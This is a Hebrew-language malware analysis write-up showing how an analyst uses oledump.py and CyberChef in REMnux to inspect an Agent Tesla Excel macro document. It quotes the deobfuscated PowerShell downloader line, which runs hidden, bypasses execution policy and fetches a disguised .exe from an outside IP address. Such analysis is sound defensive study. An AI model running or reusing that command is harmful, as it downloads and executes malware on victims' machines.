## ניתוח מסמך זדוני באמצעות oledump.py

במשימה זו נשתמש בכלי **oledump.py** כדי לבצע ניתוח סטטי על מסמך Excel שחשוד כזדוני.

**Oledump.py** הוא כלי מבוסס Python המנתח קובצי OLE2 (המכונים לעיתים Structured Storage או Compound File Binary Format). ראשי התיבות OLE מייצגים את הטכנולוגיה **Object Linking and Embedding** של מיקרוסופט. קובצי OLE2 משמשים בדרך כלל לאחסון סוגי נתונים מרובים, כגון מסמכים, גיליונות אלקטרוניים ומצגות, בתוך קובץ יחיד. כלי זה שימושי מאוד לחילוץ ובחינת התוכן של קובצי OLE2, מה שהופך אותו למשאב בעל ערך עבור ניתוח פורנזי וזיהוי נוזקות.

# 🛡️ יומן האנליסט שלי: תחקור Agent Tesla בסביבת REMnux

נכנסתי למעבדה שלי והפעלתי את **REMnux** (Reverse-Engineering Malware Linux). עבורי, זו לא סתם מערכת הפעלה – זו סביבת העבודה הטקטית שלי. היא מבוססת אובונטו ומיועדת כולה למטרה אחת: **פירוק ותחקור של תוכנות זדוניות**.

הפלטפורמה הזו מרכזת עבורי מאות כלים מותקנים מראש לביצוע ניתוח סטטי ודינמי, והיום השתמשתי בה כדי לנתח קובץ Excel חשוד שהתברר כנוזקת ה-**Agent Tesla**.

---

## 🔍 שלב 1: ניתוח סטטי עם `oledump.py`

התחלתי בניתוח סטטי של המסמך `agenttesla.xlsm`. המטרה שלי הייתה לחשוף קוד מוסתר בלי להריץ את הקובץ ובלי לסכן את המערכת. השתמשתי בטכנולוגיית ה-OLE (Object Linking and Embedding) כדי לראות איך המידע מאורגן בפנים.

* **הפקודה שהרצתי:** `oledump.py agenttesla.xlsm`
* **הממצא המפליל:** בתוך "זרמי הנתונים" (Streams), זיהיתי מיד בסטרים מספר 4 את האות **'M'** הגדולה. עבורי, זהו ה"אקדח המעשן" – האות M מסמלת קיומו של **VBA Macro**. תוקפים משתמשים בזה כדי להריץ פקודות ברגע שהמשתמש מאשר את תוכן המסמך.

---

## 🔓 שלב 2: חילוץ ופענוח הקוד (Decompression)

הקוד שזיהיתי היה דחוס ולא קריא. כדי להבין את הכוונה האמיתית של התוקף, השתמשתי בפרמטר שפורס את הקוד למבנה ה-VBA המקורי שלו.

* **הפקודה:** `oledump.py agenttesla.xlsm -s 4 --vbadecompress`
* **מה שגיליתי:** נחשף בפניי קוד VBA "מלוכלך" (Obfuscated). התוקף פיזר תווים כמו `^` ו-`*` בתוך הפקודות כדי לבלבל סורקים אוטומטיים ואנליסטים מתחילים. אבל בתוך כל ה"רעש" הזה, זיהיתי קריאות לפונקציות מסוכנות כמו `Shell` וכתובת IP חשודה.

---

## 🧪 שלב 3: ניקוי ה-Obfuscation ב-CyberChef

כדי לנקות את הבלגן, העברתי את המחרוזות החשודות ל-**CyberChef**.

1. השתמשתי בפעולת `Find/Replace` כדי למחוק את כל הכוכביות (`*`).
2. השתמשתי שוב ב-`Find/Replace` כדי למחוק את כל סימני ה-Caret (`^`).

**התוצאה שקיבלתי הייתה פקודת PowerShell נקייה וברורה:**

> `powershell -WindowStyle hidden -executionpolicy bypass; $TempFile = [IO.Path]::GetTempFileName()... Invoke-WebRequest -Uri "http://193.203.203.67/rt/Doc-3737122pdf.exe"...`

## 🏁 המסקנה הסופית שלי

לאחר הניתוח, אני יכול לקבוע בוודאות שמדובר ב-**Downloader** זדוני:

* **הסוואה:** הוא מתחזה לקובץ PDF תמים, אך למעשה מוריד קובץ הרצה (`.exe`).
* **פעילות חשאית:** הוא משתמש ב-`WindowStyle hidden` כדי שהמשתמש לא יבחין בחלון הטרמינל שנפתח.
* **המטרה:** פנייה לשרת חיצוני (`193.203.203.67`), הורדת הנוזקה Agent Tesla למחשב הקורבן והרצתה באופן מיידי.

**תובנה אישית:** הניתוח הזה הוכיח לי שוב שגם קובץ אופיס פשוט יכול להיות קטלני. בזכות הכלים ב-REMnux, הצלחתי לעצור את האיום עוד לפני שהוא התחיל.
